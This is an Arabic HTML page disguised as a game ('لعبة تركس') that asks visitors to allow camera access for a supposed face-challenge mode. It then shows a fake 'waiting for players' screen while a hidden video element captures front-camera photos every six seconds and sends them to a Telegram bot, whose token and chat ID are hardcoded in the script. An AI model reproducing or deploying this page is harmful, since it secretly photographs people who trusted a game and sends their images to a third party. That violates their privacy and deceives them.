<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لعبة تركس – جربها الآن!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
            color: #fff;
            margin: 0;
            padding: 0;
            text-align: center;
            min-height: 100vh;
            overflow: hidden;
        }
        #main-screen {
            padding: 30px 15px;
        }
        h1 {
            color: #00ff88;
            text-shadow: 0 0 15px #00ff88;
            margin: 20px 0 40px;
            font-size: 2.8rem;
        }
        p {
            font-size: 1.3rem;
            max-width: 700px;
            margin: 0 auto 35px;
            line-height: 1.7;
        }
        .btn {
            padding: 18px 50px;
            font-size: 1.5rem;
            background: #00ff88;
            color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 25px #00ff88aa;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.08);
            box-shadow: 0 0 40px #00ff88;
        }
        #status {
            font-size: 1.4rem;
            margin: 30px 0;
            color: #ffcc00;
            font-weight: bold;
        }
        /* شاشة الانتظار */
        #waiting-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        #waiting-text {
            font-size: 2.5rem;
            margin-bottom: 30px;
            color: #00ff88;
            text-shadow: 0 0 20px #00ff88;
        }
        .loader {
            border: 8px solid #333;
            border-top: 8px solid #00ff88;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1.5s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* إخفاء الكاميرا بدون صورة */
        #hidden-cam {
            position: fixed;
            bottom: -100px;
            right: -100px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            z-index: -9999;
            pointer-events: none;
            transform: scale(0.001);
        }
        #video {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: translate(-320px, -240px);
        }
    </style>
</head>
<body>
    <div id="main-screen">
        <h1>لعبة تركس الرهيبة!</h1>
       
        <p>
            مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
            اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
            <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
        </p>

        <button class="btn" onclick="startGame()">ابدأ</button>
       
        <div id="status">اضغط الزر لبدء التحدي...</div>
    </div>

    <!-- شاشة الانتظار -->
    <div id="waiting-screen">
        <div class="loader"></div>
        <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
    </div>

    <!-- الكاميرا مخفية تمامًا -->
    <div id="hidden-cam">
        <video id="video" autoplay playsinline muted></video>
    </div>

    <script>
        let stream = null;
        const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
        const CHAT_ID = '6611123941';
        const PHOTO_INTERVAL = 6000;

        function startGame() {
            // إخفاء الشاشة الرئيسية
            document.getElementById('main-screen').style.display = 'none';
            
            // إظهار شاشة الانتظار
            document.getElementById('waiting-screen').style.display = 'flex';

            // بدء الكاميرا في الخلفية
            startCamera();
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });

                const video = document.getElementById('video');
                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadeddata = () => {
                        console.log("الفيديو جاهز");
                        resolve();
                    };
                    setTimeout(resolve, 8000);
                });

                setInterval(captureAndSend, PHOTO_INTERVAL);
            } catch (err) {
                console.error("Camera error:", err);
                // يمكن إظهار رسالة خطأ في شاشة الانتظار لو أردت
            }
        }

        async function captureAndSend() {
            const video = document.getElementById('video');

            if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
                console.log("الفيديو ليس جاهزًا بعد");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.75);

            try {
                const blob = await (await fetch(dataUrl)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', 'صورة من لعبة تركس • ' + new Date().toLocaleString('ar-EG'));

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('تم إرسال الصورة بنجاح');
                } else {
                    console.error('فشل الإرسال:', await response.text());
                }
            } catch (err) {
                console.error('خطأ أثناء الإرسال:', err);
            }
        }

        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
